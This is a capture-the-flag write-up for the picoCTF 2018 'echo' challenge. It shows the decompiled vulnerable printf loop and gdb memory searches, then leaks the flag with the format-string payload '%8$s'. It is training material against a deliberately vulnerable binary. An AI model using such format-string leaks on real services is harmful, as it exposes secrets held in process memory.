# Picoctf 2018 echo

Let's take a look at the binary:

```
$    file echo
echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=a5f76d1d59c0d562ca051cb171db19b5f0bd8fe7, not stripped
$    pwn checksec echo
[*] '/Hackery/pod/modules/fmt_strings/pico18_echo/echo'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$    ./echo
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %x.%x
40.f7f925c0
> guyinatuxedo
guyinatuxedo
```

So we can see that we are dealing with a 32 bit executable. When we run it, it prompts us for input and prints it back to us. We can also see that with `%x` that there is a format string bug (when printf doesn't specify the format for data to be printed, and the data can). Looking at the main function in ghidra, we see this:

```

void main(void)

{
  __gid_t __rgid;
  FILE *flagFile;
  char input [64];
  char flag [64];
 
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  memset(input,0,0x40);
  memset(input,0,0x40);
  puts("Time to learn about Format Strings!");
  puts("We will evaluate any format string you give us with printf().");
  puts("See if you can get the flag!");
  flagFile = fopen("flag.txt","r");
  if (flagFile == (FILE *)0x0) {
    puts(
        "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are runningthis on the shell server."
        );
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(flag,0x40,flagFile);
  do {
    printf("> ");
    fgets(input,0x40,stdin);
    printf(input);
  } while( true );
}
```

So we can see a few things here. First the format string bug takes place in a loop that on paper will run infinitely (the while true loop). However before that, we see that it actually scans the contents of the flag file to a char array on the stack for `main`, so it's not too far away (also we need to have a `flag.txt` file in the same directory as the executable when we run it). If we can find the offset to it's pointer, we can just print it using `%s` with the format string bug. We can check the offset using gdb. We will essentially just leak a bunch of values, check to see where the flag is in memory, and see if any of those values is a pointer to the flag:

```
$    cat flag.txt
flag{flag}
$    gdb ./echo
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
75 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 5 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./echo...(no debugging symbols found)...done.
gef➤  r
Starting program: /Hackery/pod/modules/fmt_strings/pico18_echo/echo
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
40.f7faf5c0.8048647.f7fdf409.f63d4e2e.f7ffdaf8.ffffd124.ffffd02c.3e8.804b160.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.> 40.f7faf5c0.8048647.f7fdf409.f63d4e2e.f7ffdaf8.ffffd124.ffffd02c.3e8.804b160.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
> ^C
Program received signal SIGINT, Interrupt.
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xfffffe00
$ebx   : 0x0       
$ecx   : 0x0804c2d0  →  "%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x[...]"
$edx   : 0x400     
$esp   : 0xffffce70  →  0xffffced8  →  0x0000003f ("?"?)
$ebp   : 0xffffced8  →  0x0000003f ("?"?)
$esi   : 0xf7faf5c0  →  0xfbad2288
$edi   : 0xf7faf000  →  0x001d7d6c ("l}"?)
$eip   : 0xf7fd5059  →  <__kernel_vsyscall+9> pop ebp
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce70│+0x0000: 0xffffced8  →  0x0000003f ("?"?)     ← $esp
0xffffce74│+0x0004: 0x00000400
0xffffce78│+0x0008: 0x0804c2d0  →  "%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x[...]"
0xffffce7c│+0x000c: 0xf7ebdcd7  →  0xfff0003d ("="?)
0xffffce80│+0x0010: 0x00000000
0xffffce84│+0x0014: 0x00000000
0xffffce88│+0x0018: 0xf7e4b1b9  →  <_IO_doallocbuf+9> add ebx, 0x163e47
0xffffce8c│+0x001c: 0xf7faf5c0  →  0xfbad2288
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7fd5053 <__kernel_vsyscall+3> mov    ebp, esp
   0xf7fd5055 <__kernel_vsyscall+5> sysenter
   0xf7fd5057 <__kernel_vsyscall+7> int    0x80
 → 0xf7fd5059 <__kernel_vsyscall+9> pop    ebp
   0xf7fd505a <__kernel_vsyscall+10> pop    edx
   0xf7fd505b <__kernel_vsyscall+11> pop    ecx
   0xf7fd505c <__kernel_vsyscall+12> ret    
   0xf7fd505d                  nop    
   0xf7fd505e                  nop    
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "echo", stopped, reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7fd5059 → __kernel_vsyscall()
[#1] 0xf7ebdcd7 → read()
[#2] 0xf7e4a188 → _IO_file_underflow()
[#3] 0xf7e4b2ab → _IO_default_uflow()
[#4] 0xf7e3e151 → _IO_getline_info()
[#5] 0xf7e3e29e → _IO_getline()
[#6] 0xf7e3d04c → fgets()
[#7] 0x8048742 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
0xf7fd5059 in __kernel_vsyscall ()
gef➤  search-pattern flag{flag}
[+] Searching 'flag{flag}' in memory
[+] In '[heap]'(0x804b000-0x806d000), permission=rw-
  0x804b2c0 - 0x804b2ca  →   "flag{flag}"
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffd02c - 0xffffd036  →   "flag{flag}"
```

So we can see that on the stack the contents of `flag{flag}` resides at `0xffffd02c`. We can also see that we can reach it using the format string bug at offset `8`. With this, we can leak the flag.

```
$    ./echo
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %8$s
flag{flag}

> ^C
```

Just like that, we got the flag!
